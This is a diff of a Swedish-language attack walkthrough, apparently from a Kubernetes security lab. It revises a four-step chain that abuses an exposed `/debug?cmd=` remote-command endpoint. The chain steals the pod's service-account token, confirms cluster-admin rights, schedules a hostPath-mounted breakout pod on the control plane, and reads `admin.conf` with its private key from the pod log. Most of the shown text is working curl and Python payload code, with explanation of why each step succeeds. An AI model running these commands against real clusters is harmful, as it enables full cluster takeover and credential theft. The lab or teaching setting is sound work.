@@ -308,33 +308,102 @@ Förutsättning: angriparen har hittat webbappens exponerade `/debug?cmd=`-endpo
 
 Kubernetes API-servern behöver **inte** vara externt nåbar — alla API-anrop sker inifrån webapp-containern mot Kubernetes API-servern vars adress Kubernetes automatiskt injicerar som miljövariablerna `KUBERNETES_SERVICE_HOST` och `KUBERNETES_SERVICE_PORT` i varje pod. Observera att DNS (`kubernetes.default.svc`) inte nödvändigtvis fungerar inuti containern beroende på CoreDNS-status — env-variabelmetoden är mer robust. Angripardatorn skickar enbart HTTP-anrop mot webapp-porten.
 
+Den övergripande gången är fyra steg: stjäla service-account-token, verifiera att den har cluster-admin, skapa en pod på mastern som monterar värdens rotfilsystem och låter sin container-process skriva ut `admin.conf` på stdout, och slutligen läsa pod-loggen via K8s API. Inget kubectl och ingen container-härdningsöverträdelse behövs — bara RBAC-tillåtelsen att skapa pods med `hostPath`-volymer (vilket cluster-admin innebär).
+
 ```bash
 WEBAPP="http://<WEBAPP-IP>:30500"
 
 # Steg 1: Extrahera service account-token via RCE
-TOKEN=$(curl -s --get --data-urlencode 'cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token' "$WEBAPP/debug")
+TOKEN=$(curl -s --get --data-urlencode \
+  'cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token' \
+  "$WEBAPP/debug")
 
-# Steg 2: Verifiera cluster-admin-åtkomst via intern K8s API (Python inbyggt i Flask-containern)
-# Använd KUBERNETES_SERVICE_HOST/PORT-env-variablerna — DNS kan vara otillgängligt i containern
-curl -s --get --data-urlencode \
-  'cmd=python3 -c "import urllib.request,ssl,json,os; t=open(\"/var/run/secrets/kubernetes.io/serviceaccount/token\").read(); h=os.environ[\"KUBERNETES_SERVICE_HOST\"]; p=os.environ[\"KUBERNETES_SERVICE_PORT\"]; ctx=ssl._create_unverified_context(); r=json.loads(urllib.request.urlopen(urllib.request.Request(f\"https://{h}:{p}/api/v1/namespaces/default/pods\",headers={\"Authorization\":\"Bearer \"+t}),context=ctx).read()); print([x[\"metadata\"][\"name\"] for x in r[\"items\"]])" 2>&1' \
-  "$WEBAPP/debug"
+# Steg 2: Verifiera cluster-admin via intern K8s API (Python inbyggt i Flask-containern)
+# KUBERNETES_SERVICE_HOST/PORT-env-variablerna används — DNS kan vara otillgängligt i containern
+curl -s --get --data-urlencode 'cmd=python3 -c "\
+import urllib.request, ssl, json, os; \
+t = open(\"/var/run/secrets/kubernetes.io/serviceaccount/token\").read(); \
+h = os.environ[\"KUBERNETES_SERVICE_HOST\"]; \
+p = os.environ[\"KUBERNETES_SERVICE_PORT\"]; \
+ctx = ssl._create_unverified_context(); \
+req = urllib.request.Request( \
+    f\"https://{h}:{p}/api/v1/namespaces/default/pods\", \
+    headers={\"Authorization\": \"Bearer \" + t}); \
+r = json.loads(urllib.request.urlopen(req, context=ctx).read()); \
+print([x[\"metadata\"][\"name\"] for x in r[\"items\"]])\
+" 2>&1' "$WEBAPP/debug"
 # → listar alla pods utan 403 — bekräftar cluster-admin
 
-# Steg 3: Skapa breakout-pod med host-filsystemet monterat på control plane
-# nodeSelector styr att podden hamnar på mastern (admin.conf finns bara där)
-curl -s --get --data-urlencode \
-  'cmd=python3 -c "import urllib.request,ssl,json,os; t=open(\"/var/run/secrets/kubernetes.io/serviceaccount/token\").read(); h=os.environ[\"KUBERNETES_SERVICE_HOST\"]; p=os.environ[\"KUBERNETES_SERVICE_PORT\"]; ctx=ssl._create_unverified_context(); body=json.dumps({\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"name\":\"breakout\"},\"spec\":{\"hostPID\":True,\"nodeSelector\":{\"node-role.kubernetes.io/control-plane\":\"\"},\"tolerations\":[{\"key\":\"node-role.kubernetes.io/control-plane\",\"operator\":\"Exists\",\"effect\":\"NoSchedule\"}],\"containers\":[{\"name\":\"breakout\",\"image\":\"ubuntu\",\"command\":[\"sleep\",\"3600\"],\"volumeMounts\":[{\"mountPath\":\"/host\",\"name\":\"host-root\"}],\"securityContext\":{\"privileged\":True}}],\"volumes\":[{\"name\":\"host-root\",\"hostPath\":{\"path\":\"/\"}}]}}).encode(); req=urllib.request.Request(f\"https://{h}:{p}/api/v1/namespaces/default/pods\",data=body,headers={\"Authorization\":\"Bearer \"+t,\"Content-Type\":\"application/json\"},method=\"POST\"); print(urllib.request.urlopen(req,context=ctx).read().decode()[:100])" 2>&1' \
-  "$WEBAPP/debug"
+# Steg 3: Skapa breakout-pod på control plane med host-filsystemet monterat
+# Containern cat:ar admin.conf till stdout och avslutar — hela filen hamnar i pod-loggen
+# nodeSelector tvingar podden till mastern (admin.conf finns bara där)
+# restartPolicy=Never så kubelet inte loopar containern och roterar bort loggen
+curl -s --get --data-urlencode 'cmd=python3 -c "\
+import urllib.request, ssl, json, os; \
+t = open(\"/var/run/secrets/kubernetes.io/serviceaccount/token\").read(); \
+h = os.environ[\"KUBERNETES_SERVICE_HOST\"]; \
+p = os.environ[\"KUBERNETES_SERVICE_PORT\"]; \
+ctx = ssl._create_unverified_context(); \
+spec = { \
+    \"restartPolicy\": \"Never\", \
+    \"nodeSelector\": {\"node-role.kubernetes.io/control-plane\": \"\"}, \
+    \"tolerations\": [{ \
+        \"key\": \"node-role.kubernetes.io/control-plane\", \
+        \"operator\": \"Exists\", \
+        \"effect\": \"NoSchedule\"}], \
+    \"containers\": [{ \
+        \"name\": \"breakout\", \
+        \"image\": \"ubuntu\", \
+        \"command\": [\"sh\", \"-c\", \"cat /host/etc/kubernetes/admin.conf\"], \
+        \"volumeMounts\": [{\"mountPath\": \"/host\", \"name\": \"host-root\"}]}], \
+    \"volumes\": [{\"name\": \"host-root\", \"hostPath\": {\"path\": \"/\"}}] \
+}; \
+body = json.dumps({ \
+    \"apiVersion\": \"v1\", \
+    \"kind\": \"Pod\", \
+    \"metadata\": {\"name\": \"breakout\"}, \
+    \"spec\": spec}).encode(); \
+req = urllib.request.Request( \
+    f\"https://{h}:{p}/api/v1/namespaces/default/pods\", \
+    data=body, \
+    headers={\"Authorization\": \"Bearer \" + t, \"Content-Type\": \"application/json\"}, \
+    method=\"POST\"); \
+print(urllib.request.urlopen(req, context=ctx).read().decode()[:200])\
+" 2>&1' "$WEBAPP/debug"
 
-# Steg 4: Ladda ned kubectl och exec:a in i breakout-podden
-# /tmp är noexec i containern — använd /dev/shm (RAM, körbar)
-# Allt kedjat i ett enda anrop: lastbalansering kan annars skicka requests till olika pod-instanser
-curl -s --get --data-urlencode \
-  'cmd=python3 -c "import urllib.request; urllib.request.urlretrieve(\"https://dl.k8s.io/release/v1.31.0/bin/linux/amd64/kubectl\",\"/dev/shm/kubectl\")" && chmod 755 /dev/shm/kubectl && /dev/shm/kubectl --insecure-skip-tls-verify --server=https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT} --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) exec breakout -- cat /host/etc/kubernetes/admin.conf 2>&1' \
-  "$WEBAPP/debug"
+# (Vänta tills podden gått från Pending → Succeeded — typiskt 10–20 s första gången
+# medan ubuntu-imagen pullas. Polla status om du vill:)
+curl -s --get --data-urlencode 'cmd=python3 -c "\
+import urllib.request, ssl, json, os; \
+t = open(\"/var/run/secrets/kubernetes.io/serviceaccount/token\").read(); \
+h = os.environ[\"KUBERNETES_SERVICE_HOST\"]; \
+p = os.environ[\"KUBERNETES_SERVICE_PORT\"]; \
+ctx = ssl._create_unverified_context(); \
+req = urllib.request.Request( \
+    f\"https://{h}:{p}/api/v1/namespaces/default/pods/breakout\", \
+    headers={\"Authorization\": \"Bearer \" + t}); \
+r = json.loads(urllib.request.urlopen(req, context=ctx).read()); \
+print(r[\"status\"][\"phase\"])\
+" 2>&1' "$WEBAPP/debug"
+
+# Steg 4: Läs admin.conf via pod-loggen — vanlig GET mot K8s API, inget kubectl behövs
+curl -s --get --data-urlencode 'cmd=python3 -c "\
+import urllib.request, ssl, os; \
+t = open(\"/var/run/secrets/kubernetes.io/serviceaccount/token\").read(); \
+h = os.environ[\"KUBERNETES_SERVICE_HOST\"]; \
+p = os.environ[\"KUBERNETES_SERVICE_PORT\"]; \
+ctx = ssl._create_unverified_context(); \
+req = urllib.request.Request( \
+    f\"https://{h}:{p}/api/v1/namespaces/default/pods/breakout/log\", \
+    headers={\"Authorization\": \"Bearer \" + t}); \
+print(urllib.request.urlopen(req, context=ctx).read().decode())\
+" 2>&1' "$WEBAPP/debug"
 # → admin.conf med fullständiga cluster-admin-credentials inklusive privat RSA-nyckel
 ```
+
+Notera vad som **inte** behövs i breakout-podden: ingen `privileged: true`, ingen `hostPID`, inga extra Linux capabilities. Att montera värdens rotfilsystem via `hostPath` är i sig den privilegierade operationen från klustrets sida — men det visas inte i pod-specens `securityContext`. Container:n kör som UID 0 (default för `ubuntu`-imagen), vilket utan user namespaces mappar mot host UID 0, och kan därför läsa `/host/etc/kubernetes/admin.conf` (mode 0600, ägd av root). Det är RBAC:s tillåtelse att skapa pods med `hostPath`-volymer som är hela problemet — inte container-säkerhet.
+
+Att läsa filen via **pod-loggen** i stället för `kubectl exec` är medvetet: pod-loggen är en vanlig HTTP GET mot K8s API (kräver bara `pods/log`, som täcks av cluster-admin), ingen WebSocket/SPDY-uppgradering, ingen 50 MB-binär att ladda ner in i webapp-pod:n, och ingen risk att lastbalansering skickar nedladdningen till en pod-instans och exec-anropet till en annan. Container:s `command` skriver hela `admin.conf` till stdout och avslutar — kubelet sparar stdout i pod-loggen där den ligger kvar tills podden raderas.
 
 Resultatet är fullständig kontroll över klustret utan SSH-åtkomst, utan lösenord och utan att API-servern behöver vara externt exponerad. Angripardatorn kommunicerar enbart med den publikt exponerade webapp-porten (30500) under hela attacken.
 
